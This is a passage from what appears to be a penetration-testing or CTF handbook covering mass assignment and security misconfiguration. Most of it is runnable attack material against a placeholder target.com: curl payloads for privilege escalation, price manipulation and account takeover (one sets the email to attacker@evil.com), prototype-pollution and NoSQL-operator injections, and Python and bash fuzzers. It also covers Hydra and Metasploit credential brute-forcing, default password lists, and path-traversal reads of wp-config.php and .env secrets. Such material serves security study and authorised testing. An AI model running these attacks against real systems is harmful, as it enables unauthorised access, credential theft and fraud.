  "credits": 0
}

# Test adding additional properties
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","email":"att@example.com","role":"admin"}' \
  http://target.com/api/register
```

**Update Endpoint Testing:**

```bash
# Legitimate profile update
curl -X PUT \
  -H "Cookie: session=token" \
  -H "Content-Type: application/json" \
  -d '{"bio":"Hello World"}' \
  http://target.com/api/users/1234

# Test mass assignment
curl -X PUT \
  -H "Cookie: session=token" \
  -H "Content-Type: application/json" \
  -d '{"bio":"Hello","role":"admin","credits":99999,"isVerified":true}' \
  http://target.com/api/users/1234
```

### Common Vulnerable Properties

**User Object Properties:**

```bash
# Privilege escalation properties
role
user_role
user_type
privilege
access_level
permission
isAdmin
is_admin
admin
superuser

# Account manipulation
isActive
is_active
active
enabled
verified
email_verified
isVerified
banned
suspended

# Financial properties
balance
credits
points
wallet
premium
subscription
paid
tier

# Metadata
created_at
updated_at
id
user_id
```

**Testing Script:**

```python
import requests
import json

target = "http://target.com/api/users/update"
session = "user_session_token"
headers = {
    'Cookie': f'session={session}',
    'Content-Type': 'application/json'
}

# Properties to test
test_properties = {
    "role": "admin",
    "isAdmin": True,
    "admin": True,
    "privilege": "administrator",
    "access_level": 99,
    "credits": 999999,
    "balance": 100000,
    "premium": True,
    "verified": True,
    "isActive": True
}

# Test each property individually
for prop, value in test_properties.items():
    payload = {
        "bio": "test",  # Legitimate field
        prop: value     # Test field
    }
    
    print(f"Testing property: {prop}")
    r = requests.put(target, headers=headers, json=payload)
    
    if r.status_code == 200:
        print(f"[SUCCESS] Property {prop} accepted")
        print(f"Response: {r.text}")
    
    # Verify if property was updated
    verify = requests.get("http://target.com/api/users/me", headers=headers)
    if prop in verify.text and str(value) in verify.text:
        print(f"[CONFIRMED] Property {prop} was updated to {value}")
```

### JSON Mass Assignment

**Nested Object Injection:**

```bash
# Original request
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"name":"Product","price":100}' \
  http://target.com/api/products

# Inject nested admin object
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "name":"Product",
    "price":100,
    "owner":{
      "id":1,
      "role":"admin"
    }
  }' \
  http://target.com/api/products
```

**Array Property Injection:**

```bash
# Inject array of roles
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "username":"attacker",
    "password":"pass",
    "roles":["user","admin","superuser"]
  }' \
  http://target.com/api/register
```

### Framework-Specific Exploitation

**Ruby on Rails Mass Assignment:**

```bash
# Rails vulnerable pattern (before Strong Parameters)
# User.new(params[:user])

# Exploit
curl -X POST \
  -d "user[username]=attacker&user[password]=pass&user[admin]=true" \
  http://target.com/users

# JSON format
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"user":{"username":"attacker","password":"pass","admin":true}}' \
  http://target.com/users
```

**Node.js/Express:**

```bash
# Vulnerable pattern
# User.create(req.body)

# Exploit
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","isAdmin":true}' \
  http://target.com/api/users

# With nested objects
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "username":"attacker",
    "password":"pass",
    "profile":{
      "role":"admin",
      "verified":true
    }
  }' \
  http://target.com/api/users
```

**Python/Django:**

```bash
# Vulnerable pattern
# User.objects.create(**request.POST.dict())

# Exploit
curl -X POST \
  -d "username=attacker&password=pass&is_staff=True&is_superuser=True" \
  http://target.com/accounts/register
```

**PHP/Laravel:**

```bash
# Vulnerable pattern
# User::create($request->all())

# Exploit
curl -X POST \
  -d "username=attacker&password=pass&role=admin" \
  http://target.com/api/users

# JSON format
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","role":"admin"}' \
  http://target.com/api/users
```

### Object Relationship Manipulation

**Foreign Key Injection:**

```bash
# Modify ownership
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "title":"Document",
    "content":"Test",
    "owner_id":1
  }' \
  http://target.com/api/documents
  # If successful, document belongs to user ID 1 (potentially admin)

# Modify associations
curl -X PUT \
  -H "Content-Type: application/json" \
  -d '{
    "title":"Updated",
    "organization_id":999
  }' \
  http://target.com/api/documents/1234
  # May move document to different organization
```

**Many-to-Many Relationship Manipulation:**

```bash
# Add user to admin group
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "user_id":1234,
    "group_ids":[1,2,3,999]
  }' \
  http://target.com/api/users/1234/groups
  # If group 999 is admin group

# JSON array injection
curl -X PUT \
  -H "Content-Type: application/json" \
  -d '{
    "groups":["users","admins","superusers"]
  }' \
  http://target.com/api/users/1234
```

### Automated Discovery Tools

**Param Miner (Burp Extension):**

```
1. Install from BApp Store
2. Right-click request â†’ Extensions â†’ Param Miner â†’ Guess params
3. Configure options:
   - Guess GET params
   - Guess POST params
   - Guess JSON params
   - Guess headers
4. Review results in Extender â†’ Output
5. Test discovered parameters for mass assignment
```

**Custom Mass Assignment Fuzzer:**

```python
import requests
import json
import itertools

target = "http://target.com/api/users/update"
session_token = "user_session"
headers = {
    'Cookie': f'session={session_token}',
    'Content-Type': 'application/json'
}

# Comprehensive property wordlist
properties = {
    # Role/Permission
    "role": ["admin", "administrator", "superuser", "root"],
    "user_role": ["admin"],
    "isAdmin": [True, 1, "true", "1"],
    "admin": [True, 1],
    "privilege": ["admin", 99],
    "access_level": [99, 100, 999],
    "permission": ["admin", "all", "*"],
    "permissions": [["admin", "write", "delete"]],
    
    # Account status
    "isActive": [True, 1],
    "active": [True, 1],
    "verified": [True, 1],
    "isVerified": [True, 1],
    "email_verified": [True, 1],
    "banned": [False, 0],
    "suspended": [False, 0],
    "enabled": [True, 1],
    
    # Financial
    "balance": [999999, 100000],
    "credits": [999999, 100000],
    "points": [999999],
    "wallet": [999999],
    "premium": [True, 1],
    "isPremium": [True, 1],
    "subscription": ["premium", "unlimited"],
    "tier": ["premium", "platinum", "unlimited"],
    
    # Metadata (potentially dangerous)
    "id": [1, 2],
    "user_id": [1, 2],
    "created_by": [1],
    "owner_id": [1],
}

def test_property(prop, value):
    """Test single property for mass assignment"""
    payload = {
        "bio": "legitimate update",  # Known valid field
        prop: value
    }
    
    try:
        r = requests.put(target, headers=headers, json=payload, timeout=10)
        
        # Check if request was accepted
        if r.status_code in [200, 201, 204]:
            print(f"[+] Status {r.status_code}: {prop}={value}")
            
            # Verify if property was actually updated
            verify_url = "http://target.com/api/users/me"
            verify = requests.get(verify_url, headers=headers)
            
            if verify.status_code == 200:
                verify_data = verify.json()
                
                # Check if property exists in response
                if prop in verify_data:
                    if verify_data[prop] == value:
                        print(f"[!] CONFIRMED: {prop} updated to {value}")
                        print(f"    Response: {json.dumps(verify_data, indent=2)}")
                        return True
                    else:
                        print(f"[-] Property exists but value differs: {verify_data[prop]}")
                else:
                    # Check nested objects
                    if any(prop in str(v) for v in verify_data.values()):
                        print(f"[*] Property may exist in nested object")
        
        elif r.status_code == 403:
            print(f"[-] Forbidden: {prop}={value}")
        elif r.status_code == 400:
            print(f"[-] Bad Request: {prop}={value}")
            # May indicate property is recognized but value invalid
            
    except Exception as e:
        print(f"[!] Error testing {prop}: {e}")
    
    return False

def test_combinations():
    """Test combinations of properties"""
    dangerous_combos = [
        {"role": "admin", "isAdmin": True},
        {"role": "admin", "verified": True},
        {"isAdmin": True, "active": True},
        {"credits": 999999, "premium": True},
    ]
    
    for combo in dangerous_combos:
        payload = {"bio": "test"}
        payload.update(combo)
        
        print(f"\n[*] Testing combination: {combo}")
        r = requests.put(target, headers=headers, json=payload)
        if r.status_code == 200:
            print(f"[+] Combination accepted!")

# Test all properties
print("[*] Starting mass assignment scan...")
found_vulns = []

for prop, values in properties.items():
    for value in values:
        print(f"\n[*] Testing: {prop} = {value}")
        if test_property(prop, value):
            found_vulns.append((prop, value))

print("\n" + "="*60)
print(f"[*] Scan complete. Found {len(found_vulns)} potential vulnerabilities:")
for prop, value in found_vulns:
    print(f"    - {prop}: {value}")

# Test combinations if individual properties found
if found_vulns:
    print("\n[*] Testing property combinations...")
    test_combinations()
```

### MongoDB-Specific Mass Assignment

**NoSQL Injection via Mass Assignment:**

```bash
# Update user with $set operator injection
curl -X PUT \
  -H "Content-Type: application/json" \
  -d '{
    "bio": "Updated",
    "$set": {
      "role": "admin",
      "isAdmin": true
    }
  }' \
  http://target.com/api/users/1234

# Query operator injection
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "password": "pass",
    "$where": "this.role = \"admin\""
  }' \
  http://target.com/api/login
```

**MongoDB Operator Abuse:**

```bash
# $ne (not equal) to bypass validation
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "password": {"$ne": null},
    "role": "admin"
  }' \
  http://target.com/api/auth

# $gt (greater than) for privilege escalation
curl -X PUT \
  -H "Content-Type: application/json" \
  -d '{
    "credits": {"$gt": 0},
    "role": "admin"
  }' \
  http://target.com/api/users/update

# $in operator for role injection
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "roles": {"$in": ["admin", "superuser"]}
  }' \
  http://target.com/api/register
```

### Content-Type Switching

**XML to JSON Conversion:**

```bash
# Original JSON request
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"pass"}' \
  http://target.com/api/register

# Switch to XML with mass assignment
curl -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
       <user>
         <username>attacker</username>
         <password>pass</password>
         <role>admin</role>
         <isAdmin>true</isAdmin>
       </user>' \
  http://target.com/api/register
```

**Form-Encoded to JSON:**

```bash
# If application accepts multiple content types
curl -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=user&password=pass" \
  http://target.com/api/register

# Try JSON with additional fields
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","role":"admin"}' \
  http://target.com/api/register
```

### Prototype Pollution (Node.js)

**JavaScript Object Pollution:**

```bash
# Pollute Object prototype
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "password": "pass",
    "__proto__": {
      "isAdmin": true,
      "role": "admin"
    }
  }' \
  http://target.com/api/register

# Constructor pollution
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "constructor": {
      "prototype": {
        "isAdmin": true
      }
    }
  }' \
  http://target.com/api/register

# Pollute via nested path
curl -X PUT \
  -H "Content-Type: application/json" \
  -d '{
    "profile": {
      "__proto__": {
        "role": "admin"
      }
    }
  }' \
  http://target.com/api/users/update
```

**Detection Script:**

```javascript
// Test for prototype pollution vulnerability
const testPayloads = [
  {"__proto__": {"polluted": "true"}},
  {"constructor": {"prototype": {"polluted": "true"}}},
  {"__proto__.polluted": "true"}
];

testPayloads.forEach(payload => {
  fetch('http://target.com/api/endpoint', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(payload)
  }).then(() => {
    // Check if pollution occurred
    if (Object.prototype.polluted === "true") {
      console.log('Prototype pollution confirmed!');
    }
  });
});
```

### Bypassing Input Validation

**Unicode/Encoding Tricks:**

```bash
# Unicode property names
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","r\u006fle":"admin"}' \
  http://target.com/api/register
  # r\u006fle decodes to "role"

# Case variation
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","Role":"admin","ROLE":"admin"}' \
  http://target.com/api/register

# Homoglyph attack (visually similar characters)
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","rÐ¾le":"admin"}' \
  http://target.com/api/register
  # "Ð¾" is Cyrillic, not Latin 'o'
```

**Nested Property Access:**

```bash
# Deep nesting to bypass validation
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "profile": {
      "settings": {
        "user": {
          "role": "admin"
        }
      }
    }
  }' \
  http://target.com/api/register

# Array notation
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "roles": ["user"],
    "roles[1]": "admin"
  }' \
  http://target.com/api/register
```

### Batch Operations Exploitation

**Bulk Update Mass Assignment:**

```bash
# Single update (blocked)
curl -X PUT \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  http://target.com/api/users/1234

# Bulk update (may bypass validation)
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "updates": [
      {"id": 1234, "role": "admin"},
      {"id": 1235, "role": "admin"}
    ]
  }' \
  http://target.com/api/users/bulk-update

# Alternative bulk format
curl -X PATCH \
  -H "Content-Type: application/json" \
  -d '[
    {"op":"replace","path":"/role","value":"admin"}
  ]' \
  http://target.com/api/users/1234
  # JSON Patch format (RFC 6902)
```

### GraphQL Mass Assignment

**GraphQL Mutation Testing:**

```graphql
# Registration mutation
mutation {
  registerUser(input: {
    username: "attacker"
    password: "pass"
    email: "att@example.com"
    role: "admin"
    isAdmin: true
    credits: 999999
  }) {
    id
    username
    role
    isAdmin
    credits
  }
}

# Update mutation
mutation {
  updateUser(id: 1234, input: {
    bio: "Updated"
    role: "admin"
    verified: true
  }) {
    id
    role
    verified
  }
}
```

**GraphQL Introspection for Property Discovery:**

```graphql
# Discover all input types
query {
  __schema {
    types {
      name
      kind
      inputFields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

# Target specific input type
query {
  __type(name: "UserInput") {
    inputFields {
      name
      type {
        name
      }
    }
  }
}
```

**GraphQL Testing Script:**

```python
import requests
import json

target = "http://target.com/graphql"
headers = {'Content-Type': 'application/json'}

# Discover input fields
introspection_query = """
query {
  __type(name: "UserInput") {
    inputFields {
      name
      type {
        name
      }
    }
  }
}
"""

r = requests.post(target, json={'query': introspection_query}, headers=headers)
fields = r.json()['data']['__type']['inputFields']

print("[*] Discovered input fields:")
for field in fields:
    print(f"  - {field['name']}: {field['type']['name']}")

# Test mass assignment with all discovered fields
test_mutation = """
mutation {
  createUser(input: {
    username: "attacker"
    password: "pass"
    %s
  }) {
    id
    role
    isAdmin
  }
}
"""

dangerous_fields = [
    'role: "admin"',
    'isAdmin: true',
    'privilege: 99',
    'credits: 999999'
]

for field in dangerous_fields:
    mutation = test_mutation % field
    print(f"\n[*] Testing: {field}")
    r = requests.post(target, json={'query': mutation}, headers=headers)
    print(f"Response: {json.dumps(r.json(), indent=2)}")
```

### Real-World Exploitation Scenarios

**Scenario 1: E-commerce Price Manipulation**

```bash
# Legitimate checkout
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "product_id": 123,
    "quantity": 1
  }' \
  http://target.com/api/cart/add

# Mass assignment to modify price
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "product_id": 123,
    "quantity": 1,
    "price": 0.01,
    "discount": 100,
    "total": 0.01
  }' \
  http://target.com/api/cart/add

# Complete purchase
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"cart_id": 456}' \
  http://target.com/api/checkout
```

**Scenario 2: Account Takeover via Email Change**

```bash
# Update profile with injected email_verified flag
curl -X PUT \
  -H "Cookie: session=victim_session" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@evil.com",
    "email_verified": true,
    "verification_token": null
  }' \
  http://target.com/api/users/profile

# Bypasses email verification requirement
```

**Scenario 3: Premium Feature Unlock**

```bash
# Inject premium status during registration
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "password": "pass",
    "email": "att@example.com",
    "subscription": "premium",
    "subscription_expires": "2099-12-31",
    "features": ["advanced", "unlimited", "priority"]
  }' \
  http://target.com/api/register
```

### Comprehensive Testing Checklist

```bash
#!/bin/bash
# Mass Assignment Testing Checklist

TARGET="http://target.com/api"
ENDPOINT="$TARGET/users/update"
SESSION="session_token"

echo "[*] Mass Assignment Security Assessment"
echo "========================================"

# Test 1: Role escalation
echo -e "\n[1] Testing role escalation..."
for role in admin administrator superuser root moderator; do
  curl -s -X PUT \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/json" \
    -d "{\"role\":\"$role\"}" \
    "$ENDPOINT" | grep -q "success" && echo "[!] Vulnerable to role: $role"
done

# Test 2: Boolean flags
echo -e "\n[2] Testing boolean flags..."
for flag in isAdmin is_admin admin verified isVerified premium isPremium; do
  curl -s -X PUT \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/json" \
    -d "{\"$flag\":true}" \
    "$ENDPOINT" | grep -q "success" && echo "[!] Vulnerable to flag: $flag"
done

# Test 3: Financial properties
echo -e "\n[3] Testing financial properties..."
for prop in balance credits points wallet; do
  curl -s -X PUT \
    -H "Cookie: session=$SESSION" \
    -H "Content-Type: application/json" \
    -d "{\"$prop\":999999}" \
    "$ENDPOINT" | grep -q "success" && echo "[!] Vulnerable to property: $prop"
done

# Test 4: ID manipulation
echo -e "\n[4] Testing ID manipulation..."
curl -s -X PUT \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"id":1,"user_id":1}' \
  "$ENDPOINT" | grep -q "success" && echo "[!] Vulnerable to ID manipulation"

# Test 5: Prototype pollution (Node.js)
echo -e "\n[5] Testing prototype pollution..."
curl -s -X PUT \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}' \
  "$ENDPOINT" | grep -q "success" && echo "[!] Vulnerable to prototype pollution"

echo -e "\n[*] Assessment complete"
```

### Mitigation Verification

After exploitation, verify the impact:

```bash
# Check updated profile
curl -H "Cookie: session=token" \
  http://target.com/api/users/me | jq '.'

# Test elevated privileges
curl -H "Cookie: session=token" \
  http://target.com/admin/dashboard

# Verify financial changes
curl -H "Cookie: session=token" \
  http://target.com/api/wallet/balance

# Test premium features
curl -H "Cookie: session=token" \
  http://target.com/api/premium/feature
```

---

**Related Topics:** Insecure Direct Object References (IDOR), horizontal/vertical privilege escalation, API security testing, object-relational mapping (ORM) vulnerabilities, input validation bypass, parameter pollution, NoSQL injection.

---

# Security Misconfiguration

## Core Concept

Security misconfiguration occurs when systems, applications, or infrastructure components are deployed with insecure default settings, unnecessary features enabled, or inadequate hardening. This category represents one of the most common vulnerability classes in CTF and real-world scenarios, often providing initial footholds or privilege escalation paths.

## Default Credentials and Configurations

### Common Default Credentials

**Database systems:**

```bash
# MySQL/MariaDB
mysql -h target.com -u root -p
# Common defaults: root:(blank), root:root, root:password, root:toor

# PostgreSQL
psql -h target.com -U postgres
# Default: postgres:postgres, postgres:(blank)

# MongoDB (no auth)
mongo target.com:27017
# Default: No authentication required on older versions

# MSSQL
sqsh -S target.com -U sa -P password
# Default: sa:sa, sa:(blank), sa:password
```

**Web applications:**

```bash
# Tomcat Manager
http://target.com:8080/manager/html
# Defaults: admin:admin, tomcat:tomcat, admin:tomcat, tomcat:s3cret

# Jenkins
http://target.com:8080/jenkins
# Default: admin:password, jenkins:jenkins

# phpMyAdmin
http://target.com/phpmyadmin
# Defaults: root:(blank), root:root, admin:admin

# WordPress
http://target.com/wp-admin
# Common: admin:admin, admin:password, administrator:password
```

**Network devices and services:**

```bash
# SSH attempts with common defaults
hydra -L users.txt -P passwords.txt ssh://target.com

# Telnet
telnet target.com
# Cisco: admin:admin, cisco:cisco
# Generic: admin:password, root:root

# SNMP community strings
onesixtyone -c community.txt target.com
# Defaults: public (read), private (read/write)

# FTP
ftp target.com
# Defaults: anonymous:(blank), ftp:ftp, admin:admin
```

### Systematic Default Credential Testing

**Using Hydra:**

```bash
# HTTP Basic Authentication
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  target.com http-get /admin

# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -V

# Multiple services scan
hydra -C default-creds.txt target.com ftp ssh mysql

# Colon-separated format (-C flag expects username:password pairs)
```

**Using Metasploit auxiliary modules:**

```bash
msfconsole

# Scan for default credentials across protocols
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS target.com
set RPORT 8080
run

# SSH default scanner
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
set VERBOSE true
run

# Database credential testing
use auxiliary/scanner/mysql/mysql_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

**Custom credential testing script:**

```python
#!/usr/bin/env python3
import requests
from requests.auth import HTTPBasicAuth
import sys

def test_default_creds(url, creds_file):
    """Test default credentials against HTTP Basic Auth"""
    
    with open(creds_file, 'r') as f:
        for line in f:
            line = line.strip()
            if ':' not in line:
                continue
                
            username, password = line.split(':', 1)
            
            try:
                response = requests.get(
                    url, 
                    auth=HTTPBasicAuth(username, password),
                    timeout=5
                )
                
                if response.status_code == 200:
                    print(f"[+] SUCCESS: {username}:{password}")
                    print(f"[+] Response length: {len(response.text)}")
                    return True
                elif response.status_code == 401:
                    print(f"[-] Failed: {username}:{password}")
                else:
                    print(f"[?] Unexpected status {response.status_code}: {username}:{password}")
                    
            except requests.exceptions.RequestException as e:
                print(f"[!] Error testing {username}:{password} - {e}")
                continue
    
    return False

# Usage
if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <url> <credentials_file>")
    sys.exit(1)

test_default_creds(sys.argv[1], sys.argv[2])
```

### Default Configuration Files

**Web server defaults:**

```bash
# Apache default pages
curl http://target.com/
# Look for "It works!" or Apache default page

# Nginx default
curl http://target.com/
# Look for "Welcome to nginx!"

# IIS default
curl http://target.com/
# Look for IIS7+ default welcome page

# Test for default SSL certificates
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -subject -issuer
# Check for "Parallels" "Plesk" or other control panel defaults
```

**Application server defaults:**

```bash
# Tomcat default applications
curl http://target.com:8080/examples/
curl http://target.com:8080/docs/
curl http://target.com:8080/host-manager/

# JBoss/WildFly default console
curl http://target.com:8080/console/
curl http://target.com:9990/console/

# WebLogic default console
curl http://target.com:7001/console/
```

**Database default installations:**

```bash
# Check MySQL default port with default credentials
mysql -h target.com -u root -p
# Press Enter for blank password

# PostgreSQL template databases
psql -h target.com -U postgres -d template1

# MongoDB without authentication
mongo mongodb://target.com:27017
show dbs

# Redis no authentication
redis-cli -h target.com
info
config get *
```

### Credential Files in Default Locations

**Common configuration file locations:**

```bash
# Web application configs
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/configuration.php
/var/www/html/.env
/var/www/html/config/database.yml

# Application servers
/usr/local/tomcat/conf/tomcat-users.xml
/opt/tomcat/conf/server.xml
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf

# Database configurations
/etc/mysql/my.cnf
/var/lib/pgsql/data/pg_hba.conf
/etc/redis/redis.conf
```

**Extracting credentials from configs (if path traversal exists):**

```bash
# WordPress config
curl "http://target.com/download?file=../../../../var/www/html/wp-config.php" | grep DB_

# Laravel .env file
curl "http://target.com/download?file=../../../../var/www/html/.env" | grep -E "DB_|APP_KEY|MAIL_"

# Tomcat users
curl "http://target.com/download?file=../../../../usr/local/tomcat/conf/tomcat-users.xml" | grep -E "username|password"
```

## Unnecessary Services Enabled

### Service Enumeration

**Nmap comprehensive service scan:**

```bash
# Full TCP port scan with version detection
nmap -p- -sV -sC -A target.com -oA full_scan

# UDP service scan (slower but critical)
sudo nmap -sU -sV --top-ports 100 target.com -oA udp_scan

# Aggressive scan with scripts
nmap -p- -sV -sC --script=vuln,exploit target.com -oA aggressive_scan

# Service-specific NSE scripts
nmap -p 21,22,23,25,80,443,445,3306,3389 --script=default,safe target.com
```

**Netcat banner grabbing:**

```bash
# TCP services
nc -v target.com 21  # FTP
nc -v target.com 22  # SSH
nc -v target.com 25  # SMTP
nc -v target.com 80  # HTTP
nc -v target.com 3306  # MySQL

# Send protocol-specific commands
echo "QUIT" | nc target.com 21
echo "HEAD / HTTP/1.0\r\n\r\n" | nc target.com 80
```

**Automated service discovery with masscan:**

```bash
# Fast port discovery
sudo masscan -p1-65535 target.com --rate=1000 -oL masscan_output.txt

# Follow up with nmap on discovered ports
ports=$(grep "open" masscan_output.txt | cut -d' ' -f3 | tr '\n' ',' | sed 's/,$//')
nmap -p$ports -sV -sC target.com
```

### High-Risk Unnecessary Services

**Administrative interfaces:**

```bash
# VMware ESXi management
https://target.com:443/ui/
https://target.com:9443/

# cPanel/WHM
https://target.com:2083/  # cPanel
https://target.com:2087/  # WHM

# Webmin
https://target.com:10000/

# Cockpit (Linux admin)
https://target.com:9090/

# Check if accessible without authentication
curl -k https://target.com:10000/ -I
```

**Development services in production:**

```bash
# PHP-FPM status page
curl http://target.com/status
curl http://target.com/fpm-status

# Node.js debug interface
curl http://target.com:9229/json

# Django debug mode
curl http://target.com/ | grep -i "DEBUG = True"

# Flask debug mode
curl http://target.com/__debug__/

# Rails development mode indicators
curl http://target.com/ | grep -i "rails development"
```

**Unnecessary network services:**

```bash
# Telnet (unencrypted remote access)
telnet target.com 23

# FTP (unencrypted file transfer)
ftp target.com

# TFTP (no authentication)
tftp target.com
get config.txt

# Finger (user enumeration)
finger @target.com
finger root@target.com

# rlogin/rsh (ancient remote access)
rlogin target.com
```

**Database services exposed publicly:**

```bash
# MySQL/MariaDB
mysql -h target.com -u root -p

# PostgreSQL
psql -h target.com -U postgres

# MongoDB
mongo mongodb://target.com:27017

# Redis
redis-cli -h target.com
# If no auth: config get *

# Memcached
telnet target.com 11211
stats
# Dump cached data
lru_crawler metadump all

# Elasticsearch
curl http://target.com:9200/
curl http://target.com:9200/_cat/indices
curl http://target.com:9200/_search?pretty
```

### SMB/CIFS Misconfigurations

**Anonymous SMB access:**

```bash
# List shares without credentials
smbclient -L //target.com -N

# Null session authentication
smbclient //target.com/sharename -N

# Using smbmap
smbmap -H target.com -u "" -p ""

# Enum4linux comprehensive enumeration
enum4linux -a target.com

# CrackMapExec
crackmapexec smb target.com -u '' -p '' --shares
```

**SMB signing disabled:**

```bash
# Check SMB signing configuration
nmap --script smb-security-mode target.com -p445

# Exploit for relay attacks (if signing disabled)
# [Inference]: This enables NTLM relay attacks to other hosts
```

### SNMP Misconfigurations

**SNMP community string enumeration:**

```bash
# Test common community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com

# SNMPwalk with found community string
snmpwalk -v 2c -c public target.com

# Enumerate system information
snmpwalk -v 2c -c public target.com 1.3.6.1.2.1.1
snmpwalk -v 2c -c public target.com system

# Extract user accounts
snmpwalk -v 2c -c public target.com hrSWInstalledName

# Network configuration
snmpwalk -v 2c -c public target.com ipRouteTable
```

**Metasploit SNMP modules:**

```bash
msfconsole
use auxiliary/scanner/snmp/snmp_login
set RHOSTS target.com
run

use auxiliary/scanner/snmp/snmp_enum
set RHOSTS target.com
set COMMUNITY public
run
```

## Directory Listing Enabled

### Manual Directory Listing Detection

**Direct enumeration:**

```bash
# Test common directories
curl http://target.com/ -I
curl http://target.com/images/ -I
curl http://target.com/uploads/ -I
curl http://target.com/files/ -I
curl http://target.com/backup/ -I
curl http://target.com/admin/ -I

# Look for directory listing indicators
curl http://target.com/uploads/ | grep -i "Index of"
curl http://target.com/uploads/ | grep -i "Directory listing"
curl http://target.com/uploads/ | grep -i "Parent Directory"
```

**Server-specific indicators:**

**Apache directory listing:**

```html
<!-- Indicators in HTML -->
<title>Index of /uploads</title>
<h1>Index of /uploads</h1>
<table><tr><th>Name</th><th>Last modified</th><th>Size</th></tr>
<a href="?C=N;O=D">Name</a>
<a href="?C=M;O=A">Last modified</a>
```

**Nginx directory listing:**

```html
<title>Index of /data</title>
<h1>Index of /data</h1>
<hr><pre><a href="../">../</a>
```

**IIS directory listing:**

```html
<!-- Older IIS versions -->
<title>target.com - /uploads/</title>
<!-- Newer versions return 403.14 by default -->
```

### Automated Directory Listing Discovery

**Using ffuf:**

```bash
# Fuzz for directories with listings
ffuf -u http://target.com/FUZZ/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -mc 200 \
  -fw 10-50 \
  -fs 0

# Filter responses containing "Index of"
ffuf -u http://target.com/FUZZ/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200 \
  -fr "Index of"
```

**Using gobuster:**

```bash
# Directory brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# With extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 50

# Look for backup directories
gobuster dir -u http://target.com -w backup-dirs.txt -t 30
```

**Using dirb:**

```bash
# Default wordlist
dirb http://target.com

# Custom wordlist with extensions
dirb http://target.com /usr/share/wordlists/dirb/common.txt -X .php,.html,.txt

# Save output
dirb http://target.com -o dirb_output.txt
```

### Exploiting Directory Listings

**Information gathering from listings:**

```bash
# Download directory listing page
curl http://target.com/uploads/ -o listing.html

# Extract all files
grep -oP 'href="\K[^"]+' listing.html | grep -v "^?" | grep -v "^\.\./"

# Download all files from listing
wget -r -np -nH --cut-dirs=1 http://target.com/uploads/

# Recursive download with depth limit
wget -r -l 2 -np -nH http://target.com/uploads/
```

**Common sensitive files in listings:**

```bash
# Backup files
.bak
.old
.backup
.swp
.save
~
.orig

# Configuration files
config.php
database.yml
.env
settings.php
wp-config.php

# Source code archives
backup.zip
backup.tar.gz
site.zip
source.tar

# Database dumps
dump.sql
backup.sql
database.sql
db.sql
```

**Automated sensitive file extraction:**

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import re

def scrape_directory_listing(url):
    """Extract files from directory listing"""
    
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Find all links
    files = []
    for link in soup.find_all('a'):
        href = link.get('href')
        if href and not href.startswith('?') and href != '../':
            files.append(href)
    
    return files

def find_sensitive_files(files):
    """Identify potentially sensitive files"""
    
    patterns = [
